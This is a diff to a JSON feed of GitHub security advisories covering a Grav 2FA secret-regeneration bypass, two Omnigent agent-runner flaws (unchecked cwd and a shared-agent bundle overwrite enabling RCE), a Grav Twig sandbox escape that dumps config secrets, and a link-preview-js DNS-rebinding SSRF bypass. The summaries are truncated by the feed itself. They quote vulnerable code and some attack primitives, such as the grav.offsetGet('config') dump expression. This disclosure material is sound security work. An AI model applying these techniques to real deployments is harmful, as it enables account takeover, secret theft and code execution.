+      "summary": "### Summary\nWhen 2FA is enabled on an account, submitting correct credentials authenticates the user but leaves them unauthorized pending TOTP verification. During this pending-challenge window, the `login.regenerate2FASecret` task which requires only `$user->exists()`, not `$user->authorized`  can be called without a CSRF nonce. It overwrites the victim's `twofa_secret` on disk with an attacker-chosen value, returns the new secret in the JSON response, and the attacker computes a valid TOTP code to complete the 2FA flow. The second factor is **reduced to password-only**. The exploit was confirmed live after enabling 2FA to a user.\n\n### Details\nFour code locations in login plugin v3.8.10 enable the chain:\n\n**1. Session user set even with 2FA pending**  \n`user/plugins/login/login.php` - `userLogin()` assigns `$session->user = $user` before TOTP verification completes. This makes `$this->grav['user']` point to the victim in the pending-challenge window.\n\n**2. `taskRegenerate2FASecret` - no authorization check**  \n`user/plugins/login/classes/Controller.php`\n\n```php\npublic function taskRegenerate2FASecret()\n{\n    $user = $this->grav['user'];\n    if ($user->exists()) {                  // \u2190 only checks exists(), NOT authorized()\n        $secret = $twoFa->createSecret();\n        $user->twofa_secret = $secret;      // overwrites victim's secret on disk\n        $user->save();\n        $json_response = [\n            'status' => 'success',\n            'image' => $image,\n            'secret' => trim(preg_replace('|(\\w{4})|', '\\\\1 ', $secret)) // \u2190 returned to attacker\n        ];\n    }\n}\n```\n\n**3. No CSRF nonce required**  \n`user/plugins/login/login.php` - the task dispatch switch only validates `twofa_cancel` for nonce. `regenerate2FASecret` is not guarded, making it exploitable via a single unauthenticated GET request on the victim's session.\n\n### PoC\n**Confirmed live** on this instance after enabling `plugins.login.twofa_enabled: true` and configuring TOTP on the `user` accou",
+      "link": "https://github.com/advisories/GHSA-7mgc-c7pq-3rr3",
+      "published": "2026-09-02T22:01:25Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-62669"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-62677",
+      "title": "Omnigent: Unvalidated os_env.cwd in agent bundle yields arbitrary host filesystem access on runners without OMNIGENT_RUNNER_WORKSPACE",
+      "summary": "### Summary\n\nAn authenticated, non-admin user can obtain **arbitrary host-filesystem read/write** (and host environment-secret disclosure) on an Omnigent **runner** by uploading an agent bundle whose `os_env.cwd` points outside any intended workspace (e.g. `/` or `/home/<victim>`). The `cwd` field is taken **verbatim** from the bundle with no validation, normalization, or boundary check anywhere in the spec pipeline.\n\nThis is a **different sink** from GHSA-jrrm-9hc7-2v3h (CWE-94, shared-agent bundle overwrite -> stdio MCP RCE). It shares the bundle-upload *vector* but is reached through the user's **own** session-scoped agent and is **not** addressed by that advisory's proposed shared-agent guard.\n\n### Preconditions\n\n- Runner realizes a session-scoped uploaded bundle **without** `OMNIGENT_RUNNER_WORKSPACE` set. When that env var is set (CLI- and host-launched sessions set it), the spec `cwd` is overridden and the attack is neutralized \u2014 so this is deployment-gated, not universal.\n- Attacker is any authenticated user (no admin scope; `_require_user` only checks identity). No shared-agent overwrite needed.\n\n### Details (verified against code)\n\n1. **Parse \u2014 no validation.** `omnigent/spec/parser.py:696` stores `cwd=str(cwd_raw)` verbatim. Absolute paths (`/`, `/etc`), `../..`, etc. are all accepted. The `sandbox.type` is likewise author-chosen and `\"none\"` is legal.\n2. **Validate \u2014 cwd unconstrained.** `omnigent/spec/validator.py` `_validate_os_env` checks only fork/scratch/egress combinations; it never references `cwd` (the sole mention, line ~526, is a comment). No boundary is applied to the cwd itself. The boundary in `server/schemas.py` validates a *caller-supplied workspace against* the spec cwd (treating the author cwd as trusted) and only for host-launched sessions \u2014 it does not bound the cwd.\n3. **Sink.** `omnigent/inner/os_env.py:890` sets `cwd = Path(spec.cwd or os.getcwd()).resolve(strict=False)` as the environment root; `os_env.py:934` does `shutil.copytree",
+      "link": "https://github.com/advisories/GHSA-p8rw-8qj3-hf33",
+      "published": "2026-09-02T22:00:54Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-62677"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-62674",
+      "title": "Omnigent: Shared Agent Bundle Overwrite Leads to Authenticated Runner RCE",
+      "summary": "### Summary\n\nAn authenticated user with edit access to their own session can overwrite a shared/template agent by uploading a full agent bundle through `PUT /sessions/{session_id}/agent`.\n\nShared/template agents are shown as not MCP-editable, but this upload path still accepts a replacement bundle. By adding a `stdio` MCP server to the shared agent, the attacker can cause future runner sessions using that shared agent to start an attacker-controlled command.\n\n### Details\n\nThe vulnerable endpoint is the full agent bundle upload route: [`PUT /sessions/{session_id}/agent`](https://github.com/omnigent-ai/omnigent/blob/10f5ae3110e162f96fb99bb6662c581abdc56cd6/omnigent/server/routes/sessions.py#L18979-L19077) \nThis route checks whether the caller can edit the session: [`LEVEL_EDIT` session permission check](https://github.com/omnigent-ai/omnigent/blob/10f5ae3110e162f96fb99bb6662c581abdc56cd6/omnigent/server/routes/sessions.py#L19003-L19025)\nBut it does not check whether the bound agent is a shared/template agent.\nShared/template agents have:\n```python\nagent.session_id is None\n```\nThe API already exposes that these agents are not meant to be MCP-editable: [`mcp_servers_editable` is false for shared/template agents](https://github.com/omnigent-ai/omnigent/blob/10f5ae3110e162f96fb99bb6662c581abdc56cd6/omnigent/server/routes/sessions.py#L18842-L18857)\nThe direct MCP edit endpoint correctly blocks shared/template agents: [`session_mcp_servers.py` shared-agent guard](https://github.com/omnigent-ai/omnigent/blob/10f5ae3110e162f96fb99bb6662c581abdc56cd6/omnigent/server/routes/session_mcp_servers.py#L170-L183)\n```python\nif agent.session_id is None:\n    raise OmnigentError(\"Built-in agents are read-only through this endpoint.\")\n```\nThe full bundle upload endpoint is missing that same guard. It stores the uploaded bundle and updates the agent row: [`agent_store.update(agent.id, new_loc)`](https://github.com/omnigent-ai/omnigent/blob/10f5ae3110e162f96fb99bb6662c581abdc56cd6/omnigent/",
+      "link": "https://github.com/advisories/GHSA-jrrm-9hc7-2v3h",
+      "published": "2026-09-02T21:55:11Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-62674"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-61842",
+      "title": "Grav: Twig sandbox config exfiltration via grav.offsetGet + dump filter (CVE-2026-44738 bypass)",
+      "summary": "### Summary\n\nThe Twig content sandbox replaces `config` with the redacted `SandboxConfig` facade and strips `Config::get`/`toArray` from the method allowlist (GHSA-j274-39qw-32c9), so editor content can't read config secrets via `config`. That's bypassable: `grav` is the raw container, `offsetget` is allow-listed on it, so `grav.offsetGet('config')` returns the real `Config`. The allow-listed filters `json_encode`/`print_r`/`yaml_encode` then serialize it at the PHP level, never hitting the sandbox method gate, dumping the whole config tree including every `plugins.*` secret (SMTP creds, API keys, plugin DB creds). Incomplete fix for GHSA-j274-39qw-32c9. `security.salt` does not leak (it lives outside config).\n\n### Details\n\nThe documented path is blocked: `config` is the `SandboxConfig` facade (`Twig.php:660`) and the raw `Config`/`Data` method entries are stripped when `config_access` is false, so `{{ config.get(...) }}` returns the default and `{{ grav.offsetGet('config').get(...) }}` raises `SecurityNotAllowedMethodError`.\n\nThe bypass uses two allow-listed primitives the redaction doesn't cover:\n\n1. `grav.offsetGet('config')` returns the raw `Config`. The `SandboxConfig` facade replaces only the `config` variable, not `grav['config']`; `offsetget` is allow-listed on `Grav\\Common\\Grav` in `system/config/security.yaml`.\n2. `json_encode`/`print_r`/`yaml_encode` serialize the object inside the filter and never call `GravSecurityPolicy::checkMethodAllowed` (`GravSecurityPolicy.php:65`), so the stripped methods don't matter.\n\nBug class: object-dumping filters bypass the sandbox member gate. The same dump reaches `page`/`pages`/`uri`/`user` via their allow-listed accessors; `config` is the secret-bearing target.\n\nReachable below the publisher-Twig opt-in: a `_`-prefixed slug is modular (`Page.php:228`), and `Page::content()` sets `$process_twig = $scan_twig_xss || $this->modularTwig()` (`Page.php:816`), so a modular child's body Twig is sandboxed-rendered even with `twi",
+      "link": "https://github.com/advisories/GHSA-mc5q-6hpj-rp7j",
+      "published": "2026-09-02T21:41:12Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-61842"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-61704",
+      "title": "link-preview-js DNS Rebinding SSRF Bypass / Incomplete Fix for CVE-2026-43897",
+      "summary": "The existing advisory GHSA-4gp8-rjrq-ch6q / CVE-2026-43897 states that the SSRF issue was fixed in 4.0.1. However, 4.0.3 remains bypassable when the documented resolveDNSHost mitigation is used.\n\nRoot cause:\nThe library validates one resolved IP address through resolveDNSHost, but later performs fetch() against the original hostname without pinning the connection to the validated IP. An attacker-controlled DNS server can return a public IP during validation and a loopback/internal IP during the final connection.\n\nImpact:\nThis allows an attacker to bypass the documented SSRF mitigation and make the server-side fetch reach loopback or internal addresses under DNS rebinding conditions.\n\nThis appears to be either an incomplete fix for CVE-2026-43897 or a new DNS rebinding SSRF bypass affecting the latest version.\n\nThe PoC was reproduced in a local-only controlled environment to avoid targeting production or third-party systems. Evidence and reproduction details can be provided privately.",
+      "link": "https://github.com/advisories/GHSA-cpjf-6666-r8fx",
+      "published": "2026-09-02T21:29:57Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-61704"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
     },
     {
       "id": "https://www.bleepingcomputer.com/news/security/hackers-exploit-critical-jfrog-artifactory-flaw-to-forge-admin-tokens/",
